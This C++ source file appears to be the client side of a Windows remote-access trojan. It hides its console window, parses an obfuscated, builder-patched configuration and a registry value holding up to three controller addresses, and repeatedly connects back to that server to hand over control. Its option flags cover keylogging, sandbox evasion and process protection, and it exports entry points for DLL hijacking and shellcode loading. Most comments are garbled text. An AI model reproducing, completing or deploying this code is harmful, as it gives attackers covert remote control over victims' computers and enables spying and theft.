#include "stdafx.h"
#include<iostream>
#include "KernelManager.h"
using namespace std;
#ifdef _WINDLL
#else
#pragma comment( linker, "/subsystem:windows /entry:wmainCRTStartup" ) 
#endif


#ifdef _DEBUG
Info MyInfo =
{

	"",
	_T("127.0.0.1"),
	_T("6669"),
	1,
	_T("127.0.0.1"),
	_T("6669"),
	1,
	_T("127.0.0.1"),
	_T("8888"),
	0,
	_T("3"),
	_T("3"),
	_T("Ĭ��"),
	_T("1.0"),
	_T("���Ա�ע"),
	{
	false,
	false,
	false,
	false,
	false,

	false,
	false,
	true,
	false,
	false,

	_T(""),
	_T(""),
	_T(""),
	_T(""),
	_T(""),

	},
};
#else
Info MyInfo =
{

};

#endif // _DEBUG

// _T("|p1:��ַ1|o1:�˿�1|t1:ͨ��1|p2:��ַ2|o2:�˿�2|t2:ͨ��2|p3:��ַ3|o3:�˿�3|t3:ͨ��3|dd:�ȴ�|cl:����|fz:����|bb:�汾|bz:��ע|jp:����|sx:ɳ��|bh:����|ll:����|dl:���|sh:�ػ�|kl:����|bd:�ر�");
TCHAR confi[1000] = _T("xiugaishiyong");

HANDLE hThread = NULL;
bool changeip = false;
int m_time_con = 0;
TCHAR szAddress[255];  //ip
TCHAR szPort[30];		//�˿�
TCHAR szPassword[255];  //ͨ������
BOOL IsTcp;			//ͨ��ģʽ


//void Getfindinfo(wstring s, const TCHAR* f1, TCHAR* outstring, BOOL* user)
//{
//	string::size_type  index = s.find(f1, 0);	if (index == s.npos)	return;
//	wstring s1 = s.substr(index, s.size() - index);
//	string::size_type index1 = s1.find_first_of('|'); if (index1 == s1.npos) return;
//	wstring s2 = s1.substr(0, index1);
//	string::size_type index2 = s2.find_first_of(':');		if (index2 == s2.npos) return;
//	wstring out = s2.substr(index2 + 1, s2.size() - index2);
//	if (out.size() < 1) return;
//	if (outstring)
//		memcpy(outstring, out.c_str(), out.size() * 2);
//	else
//		*user = out.compare(_T("0")) ? TRUE : FALSE;
//
//}
#ifndef _DEBUG
void Getfindinfo(TCHAR* s, const TCHAR* f1, TCHAR* outstring, BOOL* user)
{
	if (outstring)
		ZeroMemory(outstring, lstrlen(outstring) * 2 + 2);
	int  all, da, i, j;
	all = (int)lstrlen(s);
	da = (int)lstrlen(f1);
	for (i = 0; i < all; i++)
	{
		for (j = 0; j < da; j++)
			if (s[i + j] != f1[j])	break;
		if (j == da)
		{
			i += da;
			int first = i;
			for (; i < all; i++)
			{
				if (s[i] == _T('|'))
				{
					if (outstring)
						memcpy(outstring, s + first, (i - first) * 2);
					else
						if (s[i - 1] == _T('1'))  *user = TRUE;
					return;
				}
			}
		}
	}
}
#endif


void Analyze()
{
#ifdef _DEBUG
	return;
#else
	static bool isrun = false;
	if (isrun) return; 	else isrun = true;

	_tcsrev(confi);
	ZeroMemory(&MyInfo, sizeof(Info));

	Getfindinfo(confi, _T("p1:"), MyInfo.szAddress, NULL);
	Getfindinfo(confi, _T("o1:"), MyInfo.szPort, NULL);
	Getfindinfo(confi, _T("t1:"), NULL, &(MyInfo.IsTcp));

	Getfindinfo(confi, _T("p2:"), MyInfo.szAddress2, NULL);
	Getfindinfo(confi, _T("o2:"), MyInfo.szPort2, NULL);
	Getfindinfo(confi, _T("t2:"), NULL, &(MyInfo.IsTcp2));

	Getfindinfo(confi, _T("p3:"), MyInfo.szAddress3, NULL);
	Getfindinfo(confi, _T("o3:"), MyInfo.szPort3, NULL);
	Getfindinfo(confi, _T("t3:"), NULL, &(MyInfo.IsTcp3));

	Getfindinfo(confi, _T("dd:"), MyInfo.szRunSleep, NULL);
	Getfindinfo(confi, _T("cl:"), MyInfo.szHeart, NULL);
	Getfindinfo(confi, _T("fz:"), MyInfo.szGroup, NULL);
	Getfindinfo(confi, _T("bb:"), MyInfo.szVersion, NULL);
	Getfindinfo(confi, _T("bz:"), MyInfo.Remark, NULL);

	Getfindinfo(confi, _T("jp:"), NULL, &(MyInfo.otherset.IsKeyboard));
	Getfindinfo(confi, _T("sx:"), NULL, &(MyInfo.otherset.IsAntiSimulation));
	Getfindinfo(confi, _T("bh:"), NULL, &(MyInfo.otherset.ProtectedProcess));
	Getfindinfo(confi, _T("ll:"), NULL, &(MyInfo.otherset.antinet));
	Getfindinfo(confi, _T("dl:"), NULL, &(MyInfo.otherset.RunDllEntryProc));
	Getfindinfo(confi, _T("sh:"), NULL, &(MyInfo.otherset.Processdaemon));
	Getfindinfo(confi, _T("kl:"), NULL, &(MyInfo.otherset.puppet));
	Getfindinfo(confi, _T("bd:"), NULL, &(MyInfo.otherset.special));


	HKEY hKEY;
	DWORD dwType = REG_BINARY;
	DWORD dwTypesize = REG_DWORD;
	DWORD dw = sizeof(DWORD);
	DWORD IpDateSize = 0;
	if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_CURRENT_USER, _T("Console"), 0, KEY_READ, &hKEY))
	{
		RegQueryValueEx(hKEY, _T("IpDate"), NULL, &dwType, NULL, &IpDateSize);
	}
	if (IpDateSize > 10)
	{
		ZeroMemory(confi, 2000);
		::RegQueryValueEx(hKEY, _T("IpDate"), 0, &dwType, (LPBYTE)confi, &IpDateSize);
		Getfindinfo(confi, _T("p1:"), MyInfo.szAddress, NULL);
		Getfindinfo(confi, _T("o1:"), MyInfo.szPort, NULL);
		Getfindinfo(confi, _T("t1:"), NULL, &(MyInfo.IsTcp));

		Getfindinfo(confi, _T("p2:"), MyInfo.szAddress2, NULL);
		Getfindinfo(confi, _T("o2:"), MyInfo.szPort2, NULL);
		Getfindinfo(confi, _T("t2:"), NULL, &(MyInfo.IsTcp2));

		Getfindinfo(confi, _T("p3:"), MyInfo.szAddress3, NULL);
		Getfindinfo(confi, _T("o3:"), MyInfo.szPort3, NULL);
		Getfindinfo(confi, _T("t3:"), NULL, &(MyInfo.IsTcp3));
	}

#endif // _DEBUG
}

DWORD WINAPI MainThread(LPVOID dllMainThread)
{
	
	//��ʼ�ȴ���ʱ��
	Sleep(_ttoi(MyInfo.szRunSleep) * 1000);

	//��ʼ������ͨ��
	ISocketBase* socketClient = NULL;

	void* ptcp = new CTcpSocket;
	void* pudp = new CUdpSocket;

	while (TRUE)
	{
		if (!changeip)
		{
			Trace("qh-1");
			_tcscpy_s(szAddress, MyInfo.szAddress);
			_tcscpy_s(szPort, MyInfo.szPort);
			IsTcp = MyInfo.IsTcp;
			changeip = (!changeip);
		}
		else
		{
			Trace("qh-2");
			_tcscpy_s(szAddress, MyInfo.szAddress2);
			_tcscpy_s(szPort, MyInfo.szPort2);
			IsTcp = MyInfo.IsTcp2;
			changeip = (!changeip);
		}

		//��������IP�˿�
		m_time_con++;
		if (m_time_con == 200)
		{
			Trace("by3");
			_tcscpy_s(szAddress, MyInfo.szAddress3);
			_tcscpy_s(szPort, MyInfo.szPort3);
			IsTcp = MyInfo.IsTcp3;
			m_time_con = 0;
			//������������
		}

		if (socketClient)
			socketClient->Disconnect();

		if (IsTcp == 1)
			socketClient = (CTcpSocket*)ptcp;
		else
			socketClient = (CUdpSocket*)pudp;
		Sleep(_ttoi(MyInfo.szHeart) * 1000);

		if (!socketClient->Connect(szAddress, _ttoi(szPort)))
		{
			continue;
		}
		CKernelManager	manager(socketClient, MyInfo.otherset.puppet);
		BYTE Token[2] = {};
		Token[0] = TOKEN_GETVERSION;
#ifdef _WIN64
		Token[1] = 1;
#else
		Token[1] = 0;
#endif
		socketClient->Send(Token, 2);
		socketClient->run_event_loop();
		WaitForSingleObject(manager.hWorker, INFINITE);

	}
	return 0;
}



#ifndef _WINDLL

#include "DbgHelp.h"
int GenerateMiniDump(PEXCEPTION_POINTERS pExceptionPointers)
{
	// ���庯��ָ��
	typedef BOOL(WINAPI* MiniDumpWriteDumpT)(
		HANDLE,
		DWORD,
		HANDLE,
		MINIDUMP_TYPE,
		PMINIDUMP_EXCEPTION_INFORMATION,
		PMINIDUMP_USER_STREAM_INFORMATION,
		PMINIDUMP_CALLBACK_INFORMATION
		);
	// �� "DbgHelp.dll" ���л�ȡ "MiniDumpWriteDump" ����
	MiniDumpWriteDumpT pfnMiniDumpWriteDump = NULL;
	HMODULE hDbgHelp = LoadLibrary((_T("DbgHelp.dll")));
	if (NULL == hDbgHelp)
	{
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	pfnMiniDumpWriteDump = (MiniDumpWriteDumpT)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");

	if (NULL == pfnMiniDumpWriteDump)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// ���� dmp �ļ���
	TCHAR szFileName[MAX_PATH] = { 0 };
	TCHAR* szVersion = _T("!analyze -v");
	SYSTEMTIME stLocalTime;
	GetLocalTime(&stLocalTime);
	wsprintf(szFileName, _T("%s-%04d%02d%02d-%02d%02d%02d.dmp"),
		szVersion, stLocalTime.wYear, stLocalTime.wMonth, stLocalTime.wDay,
		stLocalTime.wHour, stLocalTime.wMinute, stLocalTime.wSecond);
	HANDLE hDumpFile = CreateFile(szFileName, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ, 0, CREATE_ALWAYS, 0, 0);
	if (INVALID_HANDLE_VALUE == hDumpFile)
	{
		FreeLibrary(hDbgHelp);
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	// д�� dmp �ļ�
	MINIDUMP_EXCEPTION_INFORMATION expParam;
	expParam.ThreadId = GetCurrentThreadId();
	expParam.ExceptionPointers = pExceptionPointers;
	expParam.ClientPointers = FALSE;
	pfnMiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(),
		hDumpFile, MiniDumpWithDataSegs, (pExceptionPointers ? &expParam : NULL), NULL, NULL);
	// �ͷ��ļ�
	CloseHandle(hDumpFile);
	FreeLibrary(hDbgHelp);
	return EXCEPTION_EXECUTE_HANDLER;
}


LONG WINAPI ExceptionFilter(LPEXCEPTION_POINTERS lpExceptionInfo)
{
	// ������һЩ�쳣�Ĺ��˻���ʾ
	if (IsDebuggerPresent())
	{
		return EXCEPTION_CONTINUE_SEARCH;
	}
	return GenerateMiniDump(lpExceptionInfo);
}

int _tmain(int argc, _TCHAR* argv[])
{
	SetUnhandledExceptionFilter(ExceptionFilter);

	// ����������ʱ��С©��������ʧ
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	PostThreadMessageA(GetCurrentThreadId(), NULL, 0, 0);
	GetInputState();
	Analyze();
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	Sleep(300);
	return 0;
}
#else


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		if (hThread == NULL)
		{
#ifdef _DEBUG
		
#else
			if (lstrlen(confi)>30)
			{
				Analyze();
				if (MyInfo.otherset.RunDllEntryProc)						//dllʹ�ü��ؾ�����
				{
					hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
					WaitForSingleObject(hThread, INFINITE);
				}
			}
#endif
		}
	}
	break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}




extern "C" __declspec(dllexport) PVOID zidingyixiugaidaochuhanshu()					//�ٳ�ʹ�� �������
{
	if (hThread) return 0;
	Analyze();
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}



extern "C" __declspec(dllexport) void load(TCHAR * code)   //shellcodeʹ�ü���load
{
	if (hThread) return ;
	memcpy(confi, code, lstrlen(code) * 2 + 2);
	Analyze();
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return  ;
}

extern "C" __declspec(dllexport) PVOID run()
{
	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MainThread, 0, 0, 0);	//�����߳�
	WaitForSingleObject(hThread, INFINITE);
	return 0;
}

#endif





















